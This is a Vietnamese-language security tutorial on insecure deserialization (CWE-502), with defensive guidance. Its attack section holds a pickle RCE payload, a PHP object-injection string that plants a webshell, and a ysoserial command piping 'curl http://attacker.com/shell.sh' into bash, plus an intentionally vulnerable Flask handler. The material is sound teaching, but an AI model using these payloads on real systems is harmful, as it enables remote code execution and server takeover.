# Insecure Deserialization

> **OWASP Top 10:2025**: A08 | **CWE**: CWE-502 | **Nguồn**: PortSwigger, OWASP, NVE

## 🧱 Kiến thức Nền tảng

**Serialization** (tuần tự hóa) là quá trình chuyển đổi một đối tượng trong bộ nhớ thành chuỗi byte hoặc chuỗi ký tự để lưu trữ hoặc truyền qua mạng. **Deserialization** (giải tuần tự hóa) là quá trình ngược lại — khôi phục đối tượng từ dữ liệu đã được tuần tự hóa.

Mỗi ngôn ngữ lập trình có cơ chế serialization riêng: Java sử dụng `ObjectInputStream`/`ObjectOutputStream`, Python dùng module `pickle`, PHP dùng `serialize()`/`unserialize()`. Các framework cũng có định dạng riêng như JSON, XML, YAML.

Khi ứng dụng deserialization dữ liệu từ nguồn không đáng tin cậy (cookie, request body, message queue), đối tượng được khôi phục có thể kích hoạt các phương thức đặc biệt — gọi là **magic methods** — như `__wakeup()` trong PHP, `readObject()` trong Java, hay `__reduce__()` trong Python. Kẻ tấn công lợi dụng chuỗi các lớp có sẵn trong classpath (gọi là **gadget chain**) để thực thi mã tùy ý.

Dưới đây là ví dụ serialization bình thường trong Java:

```java
// Normal Java serialization — writing an object to a file
import java.io.*;

public class UserSession implements Serializable {
    private String username;
    private String role;

    public UserSession(String username, String role) {
        this.username = username;
        this.role = role;
    }
}

// Serialize the object to a file
UserSession session = new UserSession("alice", "user");
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("session.ser"));
oos.writeObject(session);  // Converts object to byte stream
oos.close();

// Deserialize the object from a file
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("session.ser"));
UserSession restored = (UserSession) ois.readObject();  // Restores the object
ois.close();
```

## 🔍 Mô tả lỗ hổng

Insecure Deserialization xảy ra khi ứng dụng giải tuần tự hóa dữ liệu từ nguồn do người dùng kiểm soát mà không xác thực hoặc lọc. Kẻ tấn công có thể tạo ra dữ liệu serialized chứa payload độc hại, dẫn đến:

- **Remote Code Execution (RCE)**: thực thi lệnh hệ thống thông qua gadget chain
- **Privilege Escalation**: thay đổi thuộc tính `role` từ `"user"` thành `"admin"`
- **Denial of Service**: tạo đối tượng lồng nhau cực sâu gây tràn stack
- **Data Tampering**: sửa đổi trạng thái ứng dụng

Đặc biệt nguy hiểm vì lỗ hổng này thường dẫn trực tiếp đến RCE — mức độ nghiêm trọng cao nhất.

## ⚔️ Cơ chế tấn công

**Python pickle RCE:**

```python
# Attacker crafts a malicious pickle payload
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        # __reduce__ is called during deserialization
        # Returns a tuple: (callable, args) — os.system will execute the command
        return (os.system, ('whoami',))

# Serialize the malicious object
payload = pickle.dumps(Exploit())

# When the server deserializes this payload...
pickle.loads(payload)  # Executes: os.system('whoami') — RCE achieved!
```

**PHP Object Injection:**

```php
<?php
// Vulnerable PHP class with dangerous magic method
class FileManager {
    public $logFile = '/tmp/app.log';
    public $logData = 'normal log entry';

    // __destruct is called when the object is garbage collected
    function __destruct() {
        file_put_contents($this->logFile, $this->logData);
    }
}

// Attacker-controlled serialized string — overwrites a PHP file with a webshell
$malicious = 'O:11:"FileManager":2:{s:7:"logFile";s:18:"/var/www/shell.php";s:7:"logData";s:30:"<?php system($_GET[\"cmd\"]); ?>";}';

// Vulnerable code deserializes user input directly
$obj = unserialize($malicious);  // Creates FileManager with attacker-controlled properties
// When $obj is destroyed, __destruct writes a webshell to the web root
?>
```

**Java ysoserial gadget chain** (sử dụng công cụ ysoserial):

```bash
# Generate a serialized payload using Commons Collections gadget chain
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/shell.sh | bash' > payload.ser

# Send the payload to the vulnerable endpoint
curl -X POST http://target.com/api/session \
  --data-binary @payload.ser \
  -H "Content-Type: application/x-java-serialized-object"
```

## 🛡️ Biện pháp phòng thủ

1. **Không deserialization dữ liệu từ nguồn không tin cậy** — đây là biện pháp hiệu quả nhất. Sử dụng JSON hoặc các định dạng dữ liệu đơn giản thay thế.

2. **Whitelist các class được phép** — trong Java, dùng `ObjectInputFilter` (Java 9+):

```java
// Java 9+ ObjectInputFilter — only allow specific classes
ObjectInputStream ois = new ObjectInputStream(inputStream);
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.myapp.dto.*;!*"  // Allow only classes in com.myapp.dto, reject everything else
);
ois.setObjectInputFilter(filter);
```

3. **Ký và xác thực dữ liệu serialized** — sử dụng HMAC để đảm bảo tính toàn vẹn trước khi deserialize.

4. **Loại bỏ gadget chain** — gỡ bỏ các thư viện không cần thiết (Commons Collections, Spring Beans) khỏi classpath.

5. **Giám sát và cảnh báo** — log mọi hoạt động deserialization, cảnh báo khi phát hiện class bất thường.

## 💻 Code Example

```python
# === VULNERABLE: Directly deserializing user input ===
import pickle, base64
from flask import Flask, request

app = Flask(__name__)

@app.route('/load-session', methods=['POST'])
def load_session():
    data = base64.b64decode(request.cookies.get('session'))
    session = pickle.loads(data)  # DANGEROUS: arbitrary code execution possible
    return f"Welcome {session['user']}"

# === SECURE: Using JSON with signature verification ===
import json, hmac, hashlib

SECRET_KEY = b'super-secret-key-stored-in-vault'

def sign_data(data: dict) -> str:
    """Create a signed JSON payload"""
    payload = json.dumps(data, sort_keys=True)
    signature = hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()
    return base64.b64encode(f"{payload}|{signature}".encode()).decode()

def verify_and_load(token: str) -> dict:
    """Verify signature before loading data — no deserialization of arbitrary objects"""
    decoded = base64.b64decode(token).decode()
    payload, signature = decoded.rsplit('|', 1)
    expected = hmac.new(SECRET_KEY, payload.encode(), hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("Invalid signature — data has been tampered with")
    return json.loads(payload)  # SAFE: JSON cannot instantiate arbitrary objects
```

## 📚 Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/deserialization
- OWASP: https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- CWE: https://cwe.mitre.org/data/definitions/502.html
- ysoserial: https://github.com/frohoff/ysoserial
